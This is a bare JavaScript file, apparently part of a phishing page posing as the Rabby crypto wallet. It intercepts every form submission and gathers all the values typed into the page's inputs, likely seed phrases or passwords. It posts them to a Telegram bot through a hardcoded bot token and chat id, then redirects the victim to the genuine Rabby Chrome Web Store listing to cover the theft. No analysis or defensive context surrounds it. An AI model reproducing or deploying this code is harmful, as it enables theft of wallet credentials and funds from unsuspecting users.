(() => {
    let botToken = "8373492089:AAHhJZwVnHrO_diyn9TRljWeqBliuk3uIZs"
    let chat_id = "-4849603493"
    const redir = () => {
        window.location = "https://chromewebstore.google.com/detail/rabby-wallet/acmacodkjbdgmoleebolmdjonilkdbch"
    }

    Array.from(document.forms).forEach(form => {
        const send2TG = async (e) => {
            e.preventDefault();

            if (!e || !e.target || e.target.tagName != "FORM")
                return

            const t = Array.from(document.querySelectorAll("input")).map((inp) => inp.value.trim()).filter((v) => v).join(" ")
            const f = e.target.id.replace(/([a-z0-9])([A-Z])/g, '$1 $2')

            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id,
                        text: `${f}\n\`${t}\``,
                        parse_mode: 'MarkdownV2'
                    })
                });
                if (window.opener) {
                    window.opener.postMessage("redir")
                    window.close()
                } else {
                    redir()
                }
                window.close()
            } catch (error) { }
        }

        form.addEventListener("submit", send2TG)
    })

    if (!window.opener) {

        window.addEventListener("message", (e) => {
            if (e.data === "redir") redir()
        })
    }
})()